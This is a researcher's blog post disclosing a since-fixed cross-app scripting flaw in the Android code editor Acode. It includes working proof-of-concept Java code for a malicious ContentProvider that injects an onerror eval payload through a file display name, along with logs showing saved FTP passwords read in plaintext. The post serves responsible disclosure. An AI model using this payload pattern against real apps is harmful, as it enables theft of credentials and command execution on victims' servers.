---
title: "Cross-app scripting in Acode, part 1: what I found"
date: 2026-08-17T18:00:00+05:00
categories: ["Research"]
tags: ["android", "webview", "cordova", "xss", "disclosure", "mobile"]
description: "Any app on the phone, holding no permissions at all, could run JavaScript inside Acode's WebView and read the SSH and FTP passwords it had saved. GHSA-x24x-425w-326q, CVSS 8.3."
weight: 1
ShowToc: true
TocOpen: false
aliases: ["/posts/anatomy-of-ghsa-x24x-425w-326q/"]
cover:
  image: "/img/posts/acode/acode-logo.webp"
---

This is part 1 of three.

1. **What I found**, you're here
2. [How I found it](/posts/acode-cross-app-scripting-how-i-found-it/), the methodology step by step
3. [How to prevent it](/posts/acode-cross-app-scripting-how-to-prevent-it/), the developer takeaway

---

[Acode](https://acode.app/) is an Android code editor with over a million installs. It's built on
Cordova, so the whole editor is HTML and JavaScript running in a WebView, with a bridge handing that
JavaScript real device capabilities: the filesystem, an SFTP client, an FTP client, a terminal.

In July 2026 I found a way for any app on the device to get its own JavaScript running inside that
WebView. No permissions needed beyond `INTERNET`. Once it runs it inherits the whole bridge, and it
can read the SSH and FTP passwords Acode has saved.

Reported, fixed, and published as
[GHSA-x24x-425w-326q](https://github.com/Acode-Foundation/Acode/security/advisories/GHSA-x24x-425w-326q).
CVSS v4.0 8.3, High. Fixed in 1.12.9.

The bug itself is one unescaped variable. What makes it worth writing up isn't the variable. It's
where the variable comes from, and the fact that the project had already fixed this exact class of bug
two years earlier and missed this instance.

## The short version

A code editor shows you a list of open files. Acode builds each row of that list by pasting the file's
name into a string of HTML:

```js
`<strong style="font-size: 1rem;">${name}</strong>`
```

and assigns that string to `innerHTML`. Nothing escapes `name`.

If a filename can contain `<img src=x onerror=...>`, that's script execution. On a desktop you'd
shrug, because you control your own filenames. On Android you don't, and that's the whole finding.

## Why the filename isn't yours

When an Android app opens a file another app handed it, it usually gets a `content://` URI rather than
a path. To show something useful in the UI, it asks the providing app for a human-readable name
through a column called `OpenableColumns.DISPLAY_NAME`.

That name isn't read off a disk. It's a string the *other app* returns from a cursor. The providing
app picks it freely.

This matters more than it sounds, because a real filename is a hostile place to hide a payload:

| Container | Length limit | `/` allowed | Quotes allowed | Spaces allowed |
|---|---|---|---|---|
| Real filename on disk | 255 bytes | no | yes | yes |
| `content://` display name | none | yes | yes | yes |

A real filename can't hold standard Base64, because Base64's alphabet includes `/`. A display name can
hold anything. In my PoC the display name was **2,868 characters** and carried a whole Base64-encoded
JavaScript payload.

Google has a name for this bug class in its own guidance:
`untrustworthy-contentprovider-provided-filename`. It's a known trap. Acode fell into it.

## The chain

Three links. Where the attacker's string enters, where it becomes HTML, and what makes it render.

### 1. The source

`EditorFile.name` (`src/lib/editorFile.js:881`) returns the same private `#name` field as
`get filename()` at `:672`. For a file opened from a `content://` URI, that field holds the display
name the other app supplied.

Worth pausing on: **it's the same value the project's 2024 security issue was about.**

### 2. The sink

`generateHints()` in `src/palettes/findFile/index.js` pushes every open file into a row builder:

```js
editorManager.files.forEach((file) => {
	const { uri, name } = file;
	let { location = "" } = file;
	if (location) location = helpers.getVirtualPath(location);
	list.push(hintItem(name, location, uri));
});
list.push(...files(hintItem));   // plus every file in any opened folder
```

and `hintItem()` builds the row HTML by interpolation:

```js
return {
	text: `<div style="display: flex; flex-direction: column;">
        <strong style="font-size: 1rem;">${name}</strong>
        <span style="font-size: 0.8rem; opacity: 0.8;">${subText}</span>
      <div>`,
	value: url,
};
```

Both `${name}` and `${subText}` go in raw. That string reaches the actual sink at
`src/components/inputhints/index.js:371`:

```js
return <li attr-action="hint" attr-value={value} innerHTML={text}></li>;
```

There's no `DOMPurify` import anywhere in that file.

### 3. The trigger

`findFile`, bound to **Ctrl-P** (`src/lib/commands.js:203`, `src/lib/keyBindings.js:27`).

That's the whole trigger. Open the palette. In a code editor Ctrl-P is muscle memory, one of the most
pressed shortcuts there is.

## Why the 2024 fix didn't cover it

In December 2024 the project fixed an XSS reported as issue #1090. Commit `42002a67`,
*"fix: XSS security issue #1090"*. Four files, `+8/-4`:

- added the `dompurify` dependency
- `src/dialogs/alert.js`: `innerHTML: message` became `innerHTML: DOMPurify.sanitize(message)`
- same treatment in `src/dialogs/confirm.js` and `src/dialogs/loader.js`

Look at what it didn't touch: any source. `src/lib/checkFiles.js` still passes the raw filename.
`helpers.errorMessage()` still deliberately builds HTML out of error strings.

The fix landed entirely at the sinks. So the useful question was never "is the filename escaped?" It
never was, and still isn't. The question was:

> Which *other* sinks does that same unescaped filename reach?

The Find-File palette. Same value, same app, a sink the fix never covered, still open two years later.

## Proof, step by step

All of this ran on a throwaway emulator against the public release APK. Acode `v1.12.6`
(versionCode 1001), Android 17, WebView Chrome 145.0.7632.218.

### The palette parses the injection

The first thing to establish isn't "did code run". It's the narrower question: **is the filename being
escaped, or parsed?** Different outcomes, and they look different on screen.

![The Find-File palette rendering a broken-image icon where the injected img tag was parsed, with the remainder of the payload spilling out as visible text](/img/posts/acode/04-palette-broken-image-icon.webp)

That broken-image icon is the answer. The browser tried to load an image called `x`, failed, and drew
the placeholder. It only does that for a real `<img>` element. If the filename had been escaped you'd
see the literal text `<img src=x ...>` instead.

In `logcat` the same fact shows up as:

```
java.io.FileNotFoundException: www/x
```

The WebView went looking for a file named `x` on disk. It only does that if it parsed an image tag.

This screenshot is also a *failed* payload, which is why the rest of the text is sitting there next to
the icon. Part 2 covers why. It turns on a single `>` character.

### The payload executes

With the payload fixed, the JavaScript runs inside Acode's own WebView:

![Full-screen overlay injected into Acode showing origin https://localhost, Cordova 15.0.0, localStorage contents, and the bridge globals ftp, sftp, Terminal, iap, system and acode](/img/posts/acode/01-js-executing-in-webview.webp)

The lines that matter:

```
origin  : https://localhost
cordova : 15.0.0  platform=android
--- bridge-ish globals: cordova, Cordova, ftp, sftp, Terminal, iap, system, acode
```

`origin` is `https://localhost`, not `file://`. Every piece of app content lives in one web origin, so
there's no same-origin boundary between the injected code and the editor. The injected script isn't
sandboxed away from anything.

### Delivered by an app with no permissions

The file-on-disk route needs write access to a directory Acode reads. The route that actually matters
needs nothing.

![The same payload output, this time with uri=content://com.example.myapplication.payload/payload.txt, showing delivery from an unprivileged third-party app](/img/posts/acode/02-delivered-by-unprivileged-app.webp)

The attacking app declares a `ContentProvider` and returns the payload as the display name:

```java
@Override
public Cursor query(Uri uri, String[] projection, String sel, String[] args, String sort) {
    String[] cols = projection != null ? projection
            : new String[]{ OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE };
    MatrixCursor c = new MatrixCursor(cols);
    String b64  = Base64.encodeToString(payloadJs.getBytes(), Base64.NO_WRAP);
    String name = "<img src=x onerror=\"eval(atob('" + b64 + "'))\">.txt";
    c.addRow(new Object[]{ name, name.length() });
    return c;
}
```

Registered in the manifest, plus a `<queries>` block so the app can see Acode at all on API 30+:

```xml
<queries><package android:name="com.foxdebug.acode" /></queries>

<provider
    android:name=".PayloadProvider"
    android:authorities="com.example.myapplication.payload"
    android:exported="true"
    android:grantUriPermissions="true" />
```

Then it asks Acode to open the file:

```java
Intent i = new Intent(Intent.ACTION_VIEW);
i.setDataAndType(Uri.parse("content://com.example.myapplication.payload/payload.txt"), "text/plain");
i.setPackage("com.foxdebug.acode");
i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
startActivity(i);
```

Confirmed in `logcat`:

```
PayloadProvider: served display name, 2868 chars
ACODE_PWN === JS executing inside Acode's WebView ===
ACODE_PWN origin : https://localhost
uri=content://com.example.myapplication.payload/payload.txt
```

Four steps, no root, no adb:

1. Attacker app exposes a `ContentProvider` returning the payload as `DISPLAY_NAME`
2. It sends `ACTION_VIEW` with `FLAG_GRANT_READ_URI_PERMISSION` to `com.foxdebug.acode`
3. Acode opens the "file"
4. Victim presses Ctrl-P, payload runs

Step 4 is the only part needing the user, and it's a keystroke they press constantly.

## Impact

"XSS in an editor" sounds cosmetic. It isn't, because of what the Cordova bridge hands to any
JavaScript running in that origin.

![Payload output showing the private sandbox listing, a stolen FTP credential in plaintext, a successful file write into Acode's private directory, and the enumerated sftp, ftp, Terminal and system bridge methods](/img/posts/acode/03-credential-theft-and-write.webp)

Three things demonstrated.

**Reading the private sandbox.** `system.getFilesDir()` and `system.listChildren()` walk Acode's
internal storage, normally unreachable by other apps:

```
/data/user/0/com.foxdebug.acode/files -> [public, Documents, profileInstalled]
parent -> [cache, shared_prefs, app_webview, app_database, databases, no_backup]
```

**Reading saved server credentials.** This is what turns a Medium into a High. Acode keeps saved FTP
and SFTP servers in `localStorage.storageList`, and `Url.formate()` (`src/utils/Url.js:234`) stores
the username and password *inside the URL*:

```js
if (username && password) string += enc(username) + ":" + enc(password) + "@"
```

So the payload doesn't even need a bridge call. One `localStorage` read returns the passwords in
plaintext:

```
type=ftp  alias=Prod Backup Server
url=ftp://demo-victim:hunter2@198.51.100.23:21/?mode=active&security=ftp
```

**Writing into the sandbox.** `system.writeText()` created a file in Acode's private directory,
confirmed on disk from a root shell:

```
-rw------- u0_a229 u0_a229 ... PWNED_BY_FINDFILE_XSS.txt
```

And the reach, enumerated but not invoked:

| Bridge global | Methods (excerpt) |
|---|---|
| `sftp` | **`exec`**, `connectUsingPassword`, `connectUsingKeyFile`, `getFile`, `putFile`, `rm` |
| `ftp` | **`execCommand`**, `connect`, `uploadFile`, `downloadFile`, `deleteFile` |
| `system` | `writeText`, `deleteFile`, **`setExec`**, `createSymlink`, `manageAllFiles`, `launchApp` |
| `Terminal` | `install`, `startAxs`, `stopAxs`, `uninstall`, `backup`, `restore` |
| `iap` | `purchase`, `consume`, `acknowledgePurchase` |

Stolen SFTP credentials plus `sftp.exec` means command execution on the victim's own servers. That's
the realistic worst case, and it's why a filename-rendering bug in an editor is worth 8.3.

The bridge has also *grown*. `Terminal` and `iap` weren't there in 1.10.5. Severity of any XSS in this
app rises with every release that adds a capability.

## What I deliberately didn't do

The credential in the demo points at `198.51.100.23`, RFC 5737 TEST-NET-2, non-routable. It's fake,
and I seeded it myself.

I didn't call `sftp.exec`. I didn't call `system.setExec` or `deleteFile`. I didn't connect to any host
or send a byte off the device.

A report has to *demonstrate* confidentiality and integrity loss, not *cause* it. Running a remote
command adds no evidentiary weight and turns a PoC into an attack.

## The fix

The maintainer took the minimal sink-side fix.
[PR #2559](https://github.com/Acode-Foundation/Acode/pull/2559), one file, `+2/-1`:

```diff
+import DOMPurify from "dompurify";
 ...
-			innerHTML={text}
+			innerHTML={DOMPurify.sanitize(text)}
```

I checked it actually neutralises the payload, running the exact hint HTML through dompurify and jsdom:

```
OUTPUT: <strong style="font-size: 1rem;"><img src="x">.txt</strong>
onerror survived? false   eval/atob survived? false
```

The `<img>` element survives. The `onerror` handler and the `eval(atob(...))` inside it don't. No
execution.

That closes this bug. Whether it closes the *class* is part 3.

## Timeline

| | |
|---|---|
| 2026-07-30 | Bug found and verified end to end on the emulator against the release APK |
| 2026-07-30 | Advisory drafted, private report filed via GitHub private vulnerability reporting |
| | Accepted by `bajrangCoder` (Raunak Raj), the same maintainer who wrote the 2024 #1090 fix |
| | Fixed in PR #2559, merged to `main`, roughly 19 hours from filing to fix |
| 2026-08-17 | Advisory published as GHSA-x24x-425w-326q, CVSS v4.0 8.3 High, CWE-79 / CWE-116 / CWE-749 |
| | Reporter credit: `MYounas126` |

Fast, responsive maintainer. Consistent with their two-day turnaround on #1090.

One thing still outstanding: the advisory is published but **no CVE has been assigned**. GitHub is a
CNA, so a CVE can be requested straight from the advisory.

---

Part 2 covers the methodology. How patch-diffing an old fix pointed straight at this, and the lab work,
including the single character that silently broke my first payload.

**[Part 2: How I found it](/posts/acode-cross-app-scripting-how-i-found-it/)**
